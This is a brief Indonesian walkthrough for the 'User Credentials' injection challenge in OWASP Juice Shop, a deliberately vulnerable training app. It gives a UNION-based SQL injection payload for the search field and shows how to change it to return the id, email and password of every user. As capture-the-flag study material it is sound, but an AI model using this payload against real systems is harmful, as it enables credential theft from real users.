# User Credentials

Link: https://juice-shop.herokuapp.com/#/score-board?categories=Injection

### Jawaban

1. Masukkan payload `')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM users--` pada kolom pencarian. Payload ini digunakan untuk menampilkan isi database dari tabel `users`.
<img width="1500" alt="image" src="https://github.com/user-attachments/assets/54b0d8b3-9032-4266-bac5-7d4438e97de2" />

2. Setelah itu, ubah bagian `1,2,3` menjadi `id,email,password`. Dengan cara ini, seluruh kredensial milik user yang sudah terdaftar dapat terlihat.
<img width="1500" alt="image" src="https://github.com/user-attachments/assets/0d75d39f-c534-4cbf-9428-e3aba1e9d956" />